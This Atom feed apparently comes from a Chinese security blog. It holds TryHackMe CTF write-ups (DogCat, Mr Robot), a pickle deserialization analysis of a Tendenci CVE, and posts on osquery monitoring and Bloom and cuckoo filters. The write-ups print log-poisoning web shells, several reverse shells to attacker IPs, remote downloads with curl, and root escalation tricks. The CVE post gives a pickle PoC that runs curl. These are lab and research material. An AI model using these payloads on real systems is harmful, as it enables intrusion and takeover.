<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2020-07-28T08:57:08.384Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TryHackMe DogCat</title>
    <link href="/2020/07/TryHackMe-DogCat/"/>
    <id>/2020/07/TryHackMe-DogCat/</id>
    <published>2020-07-28T08:57:08.000Z</published>
    <updated>2020-07-28T08:57:08.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dogcat"><a href="#dogcat" class="headerlink" title="dogcat"></a>dogcat</h2><p>来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。</p><pre><code>http://10.10.175.143/?view=dog</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p><p>给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。</p><pre><code>http://10.10.175.143/?view=dog%27</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p><p>再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。</p><pre><code>http://10.10.175.143/?view=dog%27%00</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p><p>尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724141429734.png" alt="image-20200724141429734"></p><p>再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724142635527.png" alt="image-20200724142635527"></p><p>绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p><p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p><p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p><pre><code>/?view=php://filter/read=convert.base64-encode/resource=dog/../index</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p><p>解码后index的内容为</p><pre><code>&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;dogcat&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;dogcat&lt;/h1&gt;    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;    &lt;div&gt;        &lt;h2&gt;What would you like to see?&lt;/h2&gt;        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;        &lt;?php            function containsStr($str, $substr) {                return strpos($str, $substr) !== false;            }        $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;            if(isset($_GET[&#39;view&#39;])) {                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {                    echo &#39;Here you go!&#39;;                    include $_GET[&#39;view&#39;] . $ext;                } else {                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;                }            }        ?&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p><pre><code>/?view=/dog/../etc/&amp;ext=passwd/?view=/dog/../etc/passwd&amp;ext=</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p><p>然后现在需要考虑的就是如果把本地文件读取来获取rce。</p><p>想试一下从<code>/proc/self/environ</code>来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。</p><pre><code>/?view=/dog/../var/log/apache2/access.log&amp;ext=&amp;aaa=&lt;?=phpinfo();?&gt;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p><p>由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话</p><pre><code>curl -v &quot;http://10.10.136.89/&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p><p>反弹一个shell回来</p><pre><code>php+-r+&#39;$sock=fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;</code></pre><p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727153957529.png" alt="image-20200727153957529"></p><p>利用<code>sudo env /bin/bash</code>获取一个root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727154232251.png" alt="image-20200727154232251"></p><p>搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现<code>.dockerenv</code>，这是个docker环境，所以可能需要docker逃逸一下？</p><p>先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl</p><pre><code>curl -o socat http://10.6.xx.xx:8000/socat</code></pre><p>再docker上执行</p><pre><code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444</code></pre><p>在自己监听主机上执行</p><pre><code>./socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p><p>再试一手CVE-2016-5195，<a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">https://github.com/scumjr/dirtycow-vdso</a></p><p>发现还是不行，查看一下系统上有没有可以利用的文件</p><p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p><pre><code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.6.xx.xx/8855 0&gt;&amp;1&quot; &gt; /opt/backups/backup.sh</code></pre><p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dogcat&quot;&gt;&lt;a href=&quot;#dogcat&quot; class=&quot;headerlink&quot; title=&quot;dogcat&quot;&gt;&lt;/a&gt;dogcat&lt;/h2&gt;&lt;p&gt;来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TryHackMe Mr Robot</title>
    <link href="/2020/07/TryHackMe-Mr-Robot/"/>
    <id>/2020/07/TryHackMe-Mr-Robot/</id>
    <published>2020-07-28T08:56:29.000Z</published>
    <updated>2020-07-28T08:56:29.554Z</updated>
    
    <content type="html"><![CDATA[<p>来自tryhackme的Mr Robot CTF</p><p>访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。</p><pre><code>http://10.10.188.224/http:/10.10.188.224/</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p><p>然后查找一个其他页面是否有别的信息。</p><pre><code>python dirbrute.py http://10.10.188.224/ -t 20 -d ./dics/DirBuster/directory-list-2.3-medium.txt</code></pre><p>查找到部分信息</p><pre><code>http://10.10.188.224/sitemaphttp://10.10.188.224/rsshttp://10.10.188.224/loginhttp://10.10.188.224/feedhttp://10.10.188.224/0http://10.10.188.224/atomhttp://10.10.188.224/imagehttp://10.10.188.224/wp-contenthttp://10.10.188.224/adminhttp://10.10.188.224/introhttp://10.10.188.224/wp-loginhttp://10.10.188.224/rss2http://10.10.188.224/licensehttp://10.10.188.224/Imagehttp://10.10.188.224/rdfhttp://10.10.188.224/page1http://10.10.188.224/readmehttp://10.10.188.224/robots......</code></pre><p>其中robots文件中提示我们有两个文件</p><pre><code>fsocity.dickey-1-of-3.txt</code></pre><p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728151142975.png" alt="image-20200728151142975"></p><p>然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？</p><p>使用在线去重：<a href="https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为" target="_blank" rel="noopener">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p><p><code>ER28-0652</code>，登陆后台。</p><p>同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传</p><pre><code>http://10.10.188.224/wp-content/uploads/2020/07/1.php</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p><p>上传的是一句话，使用蚁剑连接即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162409252.png" alt="image-20200728162409252"></p><p>为了方便操作命令，反弹一个shell回来。</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;</code></pre><p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>来升级shell模式。</p><p>在<code>/home/robot</code>目录下发现一个文件，其中包含的<code>robot:c3fcd3d76192e4007dfb496cca67e13b</code>解密是<code>abcdefghijklmnopqrstuvwxyz</code>，用户robot的密码可能就是这个。</p><p>更改到这个用户后，目录下就有我们需要的第二个key。</p><p>然后使用此用户提权，先查看一个SUID文件，<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>结果中看到这个文件，nmap在版本低于5.21的时候，可以提权</p><pre><code>/usr/local/bin/nmap  nmap version 3.81</code></pre><p>利用nmap提权获取root：</p><pre><code>robot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!sh# ididuid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)#</code></pre><p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自tryhackme的Mr Robot CTF&lt;/p&gt;
&lt;p&gt;访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.1
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>又叒叒一个基于osquery的监控</title>
    <link href="/2020/07/%E5%8F%88%E5%8F%92%E5%8F%92%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eosquery%E7%9A%84%E7%9B%91%E6%8E%A7/"/>
    <id>/2020/07/又叒叒一个基于osquery的监控/</id>
    <published>2020-07-02T07:54:01.000Z</published>
    <updated>2020-07-02T07:58:23.235Z</updated>
    
    <content type="html"><![CDATA[<h3 id="又叒叒一个基于osquery的监控"><a href="#又叒叒一个基于osquery的监控" class="headerlink" title="又叒叒一个基于osquery的监控"></a>又叒叒一个基于osquery的监控</h3><p>项目地址：<a href="https://github.com/MisakiKata/zeru" target="_blank" rel="noopener">https://github.com/MisakiKata/zeru</a></p><p>此项目是基于osquery的数据收集分析项目，用来监控主机，从最初的学习项目到现在的具有一定使用价值的项目。</p><p>数据流使用kafka来传输，客户端定时收集发送，服务的定时拉取，所以并没有实时监控。</p><p>基于osquery的项目官方有很多推荐，至于自己写一方面是为了学习django，一方面是为了二次开发。如果需要更完善和美观的项目可以采用官方的推荐。</p><h4 id="osquery配置"><a href="#osquery配置" class="headerlink" title="osquery配置"></a>osquery配置</h4><p>以下配置只是用来表示文件监控的一部分，至于其他的配置并没有使用。<code>/etc/osquery/osquery.conf</code></p><pre><code>{    &quot;options&quot;: {    &quot;config_plugin&quot;:&quot;filesystem&quot;,    &quot;logger_plugin&quot;:&quot;filesystem&quot;,    &quot;logger_path&quot;:&quot;/var/log/osquery&quot;,    &quot;disable_logging&quot;:&quot;false&quot;,    &quot;schedule_splay_percent&quot;:&quot;10&quot;,    &quot;verbose&quot;:&quot;false&quot;,    &quot;pidfile&quot;:&quot;/var/osquery/osquery.pidfile&quot;,    &quot;enable_syslog&quot;: &quot;true&quot;,    &quot;worker_threads&quot;:&quot;5&quot;,    &quot;host_identifier&quot;:&quot;hostname&quot;,    &quot;disable_events&quot;:&quot;false&quot;,    &quot;disable_audit&quot;:&quot;false&quot;,    &quot;audit_allow_config&quot;:&quot;true&quot;,    &quot;audit_allow_sockets&quot;:&quot;true&quot;    },    &quot;file_paths&quot;: {        &quot;html&quot;: [            &quot;/var/www/%%&quot;        ]    },    &quot;schedule&quot;: {        &quot;file_events&quot;: {            &quot;query&quot;: &quot;SELECT * FROM file_events;&quot;,            &quot;removed&quot;: false,            &quot;interval&quot;: 600        }    }}</code></pre><h4 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h4><p>配置根据官方推荐来即可，如果不在同一台主机，需要注意跨主机访问的配置。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>默认django的非debug模式，需要开启监控，到设置中上面的选择开启即可。如果有问题可以先关闭再调试。agent目录为客户端文件，定时运行即可。默认定时为十分钟拉取一次，需要修改到<code>apps/threat/views.py</code>修改即可。</p><p>需要主机的IP做处理，所以最好先定义agent中的IP地址。如果不定义会自己识别，但不一定正确。</p><p>系统信息中会显示全部存在的信息，为了避免大量数据加载，所以只默认显示最近七天的数据。如果需要修改时间，可以到<code>apps/logcat/views.py</code>中修改。</p><h4 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h4><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702135635.png" alt="image-20200702135628638"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702140400.png" alt="image-20200702140400754"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;a href=&quot;#又叒叒一个基于osquery的监控&quot; class=&quot;headerlink&quot; title=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;/a&gt;又叒叒一个基于osquery的监控&lt;/h3&gt;&lt;p&gt;项目地址：&lt;a hr
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-14942-Python Tendenci Unserialize</title>
    <link href="/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/"/>
    <id>/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/</id>
    <published>2020-06-22T01:45:58.000Z</published>
    <updated>2020-06-22T01:47:37.485Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>来自一个开源协会管理系统，文件<code>tendenci\apps\helpdesk\views\staff.py</code></p><pre><code class="python">def ticket_list(request):    context = {}    ......    if request.GET.get(&#39;saved_query&#39;, None):            from_saved_query = True            try:                saved_query = SavedSearch.objects.get(pk=request.GET.get(&#39;saved_query&#39;))            except SavedSearch.DoesNotExist:                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            if not (saved_query.shared or saved_query.user == request.user):                return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))            import pickle            from base64 import b64decode            query_params = pickle.loads(b64decode(str(saved_query.query).encode()))        elif not (  &#39;queue&#39; in request.GET                or  &#39;assigned_to&#39; in request.GET                or  &#39;status&#39; in request.GET                or  &#39;q&#39; in request.GET                or  &#39;sort&#39; in request.GET                or  &#39;sortreverse&#39; in request.GET                    ):</code></pre><p>从上面代码看出，这是一个从views中获取参数<code>saved_query</code>，通过id判断请求的用户和数据所属用户身份，正确后反序列化其中的query值，那么这个数据库是如下，保存的是一个文本字段。</p><pre><code class="python">class SavedSearch(models.Model):    ......    query = models.TextField(        _(&#39;Search Query&#39;),        help_text=_(&#39;Pickled query object. Be wary changing this.&#39;),        )</code></pre><p>如何去处理这个字段的值，在上个文件中，找到保存的处理方法。从post中获取<code>query_encoded</code>，判断不为空则直接保存进数据库。</p><pre><code class="python">def save_query(request):    title = request.POST.get(&#39;title&#39;, None)    shared = request.POST.get(&#39;shared&#39;, False) in [&#39;on&#39;, &#39;True&#39;, True, &#39;TRUE&#39;]    query_encoded = request.POST.get(&#39;query_encoded&#39;, None)    if not title or not query_encoded:        return HttpResponseRedirect(reverse(&#39;helpdesk_list&#39;))    query = SavedSearch(title=title, shared=shared, query=query_encoded, user=request.user)    query.save()</code></pre><p>那么如何调用的，同样去搜索关键词<code>save_query</code>找到路由，找到对应的name为<code>helpdesk_savequery</code>，找到对应的前端表单</p><pre><code>&lt;form method=&#39;post&#39; action=&#39;{% url 'helpdesk_savequery' %}&#39;&gt;    &lt;input type=&#39;hidden&#39; name=&#39;query_encoded&#39; value=&#39;{{ urlsafe_query }}&#39; /&gt;    &lt;dl&gt;        &lt;dt&gt;&lt;label for=&#39;id_title&#39;&gt;{% trans "Query Name" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;text&#39; name=&#39;title&#39; id=&#39;id_title&#39; /&gt;&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "This name appears in the drop-down list of saved queries. If you share your query, other users will see this name, so choose something clear and descriptive!" %}&lt;/dd&gt;        &lt;dt&gt;&lt;label for=&#39;id_shared&#39;&gt;{% trans "Shared?" %}&lt;/label&gt;&lt;/dt&gt;        &lt;dd&gt;&lt;input type=&#39;checkbox&#39; name=&#39;shared&#39; id=&#39;id_shared&#39; /&gt; {% trans "Yes, share this query with other users." %}&lt;/dd&gt;        &lt;dd class=&#39;form_help_text&#39;&gt;{% trans "If you share this query, it will be visible by <em>all</em> other logged-in users." %}&lt;/dd&gt;    &lt;/dl&gt;    &lt;div class=&#39;buttons&#39;&gt;        &lt;input class=&quot;btn btn-primary&quot; type=&#39;submit&#39; value=&#39;{% trans "Save Query" %}&#39;&gt;    &lt;/div&gt;    {% csrf_token %}&lt;/form&gt;</code></pre><p>从表单中可以看到，<code>query_encoded</code>是模板写入，找到<code>urlsafe_query</code>看是如何调用的，从调用结果看，就知道是后台先去序列化然后赋值给模板，前端模板操作的时候，再把这个序列化的值传入后台中去反序列化。</p><pre><code class="python">......    import pickle    from base64 import b64encode    urlsafe_query = b64encode(pickle.dumps(query_params)).decode()</code></pre><p>尝试构造一个反序列化的poc</p><pre><code class="python">import pickle,osfrom base64 import b64encodeclass exp(object):    def __reduce__(self):        return (os.system,(&#39;curl http://xxxx/py&#39;,))e = exp()b64encode(pickle.dumps(e))</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; class=&quot;headerlink&quot; title=&quot;反序列化&quot;&gt;&lt;/a&gt;反序列化&lt;/h4&gt;&lt;p&gt;来自一个开源协会管理系统，文件&lt;code&gt;tendenci\apps\helpdesk\views\staff.py&lt;/co
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python 过滤器</title>
    <link href="/2020/05/Python-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
    <id>/2020/05/Python-过滤器/</id>
    <published>2020-05-27T08:08:24.000Z</published>
    <updated>2020-05-27T08:11:28.581Z</updated>
    
    <content type="html"><![CDATA[<h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><h3 id="什么是布隆过滤器？"><a href="#什么是布隆过滤器？" class="headerlink" title="什么是布隆过滤器？"></a>什么是布隆过滤器？</h3><p>本质上布隆过滤器( BloomFilter )是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在”。</p><p>相比于传统的 Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。</p><h3 id="布隆过滤器原理"><a href="#布隆过滤器原理" class="headerlink" title="布隆过滤器原理"></a>布隆过滤器原理</h3><p>布隆过滤器内部维护一个<code>bitArray</code>(位数组)， 开始所有数据全部置 0 。当一个元素过来时，能过多个哈希函数（hash1,hash2,hash3….）计算不同的在哈希值，并通过哈希值找到对应的<code>bitArray</code>下标处，将里面的值 0 置为 1 。 需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。</p><p>下面以网址为例来进行说明, 例如布隆过滤器的初始情况如下图所示：<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205013684-856617678.jpg" alt="img"></p><p>现在我们需要往布隆过滤里中插入<code>baidu</code>这个url，经过3个哈希函数的计算，hash值分别为1，4，7，那么我们就需要对布隆过滤器的对应的bit位置1， 就如图下所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205051490-438287903.jpg" alt="img"></p><p>接下来，需要继续往布隆过滤器中添加<code>tencent</code>这个url，然后它计算出来的hash值分别3，4，8，继续往对应的bit位置1。这里就需要注意一个点， 上面两个url最后计算出来的hash值都有4，这个现象也是布隆不能确认某个元素一定存在的原因，最后如下图所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205113779-698386268.jpg" alt="img"></p><p>布隆过滤器的查询也很简单，例如我们需要查找<code>python</code>，只需要计算出它的hash值， 如果该值为2，4，7，那么因为对应bit位上的数据有一个不为1， 那么一定可以断言<code>python</code>不存在，但是如果它计算的hash值是1，3，7，那么就只能判断出<code>python</code>可能存在，这个例子就可以看出来， 我们没有存入<code>python</code>，但是由于其他key存储的时候返回的hash值正好将<code>python</code>计算出来的hash值对应的bit位占用了，这样就不能准确地判断出<code>python</code>是否存在。</p><p>因此， 随着添加的值越来越多， 被占的bit位越来越多， 这时候误判的可能性就开始变高，如果布隆过滤器所有bit位都被置为1的话，那么所有key都有可能存在， 这时候布隆过滤器也就失去了过滤的功能。至此，选择一个合适的过滤器长度就显得非常重要。</p><p>从上面布隆过滤器的实现原理可以看出，它不支持删除， 一旦将某个key对应的bit位置0，可能会导致同样bit位的其他key的存在性判断错误。</p><h3 id="如何在python中使用布隆过滤器"><a href="#如何在python中使用布隆过滤器" class="headerlink" title="如何在python中使用布隆过滤器"></a>如何在python中使用布隆过滤器</h3><ol><li><p>先去这个网站下载<code>bitarray</code>这个依赖 <code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#bitarray</code></p><p>直接安装会报错<code>error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Build Tools for Visual Studio&quot;: https://visualstudio.microsoft.com/downloads/</code></p></li><li><p>安装<code>wheel</code>文件, 防止我们主动安装报这样的错误<code>pip3 install bitarray-1.1.0-cp36-cp36m-win_amd64.whl</code></p></li><li><p><code>pip3 install pybloom_live</code></p></li></ol><p>该模块包含两个类实现布隆过滤器功能。<code>BloomFilter</code> 是定容。<code>ScalableBloomFilter</code> 可以自动扩容</p><pre><code>import pybloom_livebloom = pybloom_live.BloomFilter(capacity=10000)  #定容一万for i in range(0, 10001):    bloom.add(i)print(len(bloom))bloom.add(10002)bloom.add(10003)print(len(bloom))</code></pre><p>当超过一万时，会提示一个越界提示，<code>IndexError: BloomFilter is at capacity</code>。看起来好像不如自动扩容的好用。对比一下定容数量和扩容数量的差别。</p><p>误判率默认是设置为千分之一，按照默认的误判率来做对比，当数量在定容内，误判率远低于设置的误判率，但数量超过定容时，准确度基本按照设置的误判率来控制。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507094915132.png" alt="image-20200507094915132"></p><p>如果需要自动扩容来处理不确定的数量差别，可以使用<code>error_rate</code>来控制误判率。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507095303352.png" alt="image-20200507095303352"></p><h3 id="redis-使用"><a href="#redis-使用" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>docker拉取redis环境</p><pre><code>docker run -p 6379:6379 --name redis-redisbloom redislabs/rebloom:latest</code></pre><p>创建一个新过滤器</p><pre><code>106.54.181.x:6379&gt; bf.reserve newbloom 0.001 10000OK</code></pre><p>添加一个新的值，存在返回0，不存在会返回1</p><pre><code>106.54.181.x:6379&gt; bf.add name 1111(integer) 1106.54.181.x:6379&gt; bf.add name 1111(integer) 0</code></pre><p>判断值是否存在，不存在返回0，存在返回1。</p><pre><code>106.54.181.x:6379&gt; bf.exists name 1111(integer) 1106.54.181.x:6379&gt; bf.exists name 2222(integer) 0</code></pre><p>添加多个新的值</p><pre><code>106.54.181.187:6379&gt; bf.madd name 2222  33331) (integer) 12) (integer) 1</code></pre><p>使用<a href="https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本" target="_blank" rel="noopener">https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本</a></p><pre><code>from redisbloom.client import Clientclass _redis_bloom(object):    def __init__(self, size, error=0.001, key=&#39;name&#39;):        self.size = size        self.error = error        self.key = key        self.rb = Client(host=&#39;106.54.181.x&#39;, port=6379)        self.rb.bfCreate(self.size, self.error, self.key)        self.rb.delete(key)    def insert(self, name):        if self.rb.bfExists(self.key, name) == 0:            self.rb.bfAdd(self.key, name)            return True        else:            return Falserd = _redis_bloom(size=10000)for i in range(0, 5000):    rd.insert(i)</code></pre><h2 id="布谷鸟过滤器"><a href="#布谷鸟过滤器" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h2><h3 id="布谷鸟过滤器-1"><a href="#布谷鸟过滤器-1" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h3><p>布谷过滤器(cuckoo fliter)，这个名字来源于更早发表的布谷散列(cuckoo hash)，为了解决布隆过滤器不能删除的问题而出现。</p><p>采用一部分示意图说明布谷散列</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo0.png" alt="image"></p><p>现在我们假设有一些项要存入散列表，其每个项都有其对应的两个位置，先插入第一项A</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_A.png" alt="image"></p><p>由于插入A的时候其两个候选位置（0,2）都没有占用，所以选择第一张表或者是第二张表都可以，我们在这里默认先选择第一张表，然后插入第二项B<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_B.png" alt="image"></p><p>我们看到原来的A的位置被B占用，而A被“踢”到它的备选位置表二的2号位置上了，这就是当发生位置冲突时，布谷散列表的处理逻辑，后来的数据项将会把之前占用的项踢到另一个位置上。我们接下来插入第三项C</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_C.png" alt="image"><br>没有冲突，顺利搞定，接着插入D</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_D.png" alt="image"><br>D成功的把C踢走了，其实看到这里读者应该在猜想，会不会有一种情况，即被踢走的数据的另一个备选位置也被占用了，这样怎么办？答案是继续踢，一个踢一个，直到大家都找到自己合适的归宿为止。</p><h3 id="布谷鸟过滤器的问题"><a href="#布谷鸟过滤器的问题" class="headerlink" title="布谷鸟过滤器的问题"></a>布谷鸟过滤器的问题</h3><p>从上面看出来，布谷鸟过滤器会让数据不停的找自己的位置，这样就会达到一个循环，比如表一某个数踢走一个到表二，表二中的数又踢走一个表一，这样会不停的循环影响效率。所以这时候布谷鸟过滤器就有一个阈值，当超过这个阈值就会说明过滤器数组满了。需要扩容，而实际并不一定满。</p><p>因为上面只设置了两个巢，所以空间利用率比较低，可能也就百分之五十左右。这时候就需要改进算法， 